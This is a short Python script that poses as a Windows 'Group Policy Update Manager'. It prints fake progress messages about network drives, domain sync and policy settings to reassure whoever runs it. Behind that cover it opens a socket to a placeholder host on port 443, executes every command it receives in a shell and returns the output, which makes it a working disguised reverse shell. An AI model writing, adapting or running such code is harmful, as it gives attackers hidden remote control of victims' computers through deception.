import os, sys, time, subprocess, ctypes, socket


def _print(string):
    sys.stdout.write(string)
    sys.stdout.flush()


def main():
    ctypes.windll.kernel32.SetConsoleTitleA("Group Policy Update Manager")
    os.system("cls")

    data = ["Confirming Mapping of Network Drives", "Confirming Data Sync With Domain Controller", "Confirming Group Policy Settings"]

    print "Updating Data for", subprocess.check_output("echo %username% ", stderr=subprocess.STDOUT, shell=True)

    for item in data:
        _print(item)
        for i in range(0, 2):
            _print(".")
            time.sleep(0.5)
        _print("DONE!\n")


    HOST = 'x.x.x.x'
    PORT = 443
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    while 1:
        data = s.recv(1024)
        proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value)
    s.close()

main()
